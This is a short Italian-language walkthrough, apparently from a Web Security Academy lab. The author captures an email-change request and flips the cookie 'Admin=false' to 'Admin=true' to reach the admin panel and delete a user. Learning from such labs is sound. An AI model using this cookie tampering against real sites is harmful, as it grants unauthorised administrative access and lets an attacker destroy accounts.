
se mi loggo con `wiener:peter` e provo ad aggiornare la mia email, vedo questa chiamata

```
POST /my-account/change-email HTTP/2
Host: 0af800600340f296819e1b2d00280011.web-security-academy.net
Cookie: Admin=false; session=j6Jxalv3ERAP9sIaDmifAJh8pTi47Fw4
Content-Length: 57
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT
Upgrade-Insecure-Requests: 1
Origin: https://0af800600340f296819e1b2d00280011.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af800600340f296819e1b2d00280011.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=asd%40asdl.it&csrf=ZQvPfbcmoo3EQgvrinsbDvD43j8x7pxw
```

noto nel cookie: `Admin=false`

lo cambio con `Admin=true` e ricarico la pagina, ora vedo "admin panel"

![](_attachments/Pasted%20image%2020240904140319.png)

e posso cancellare carlos

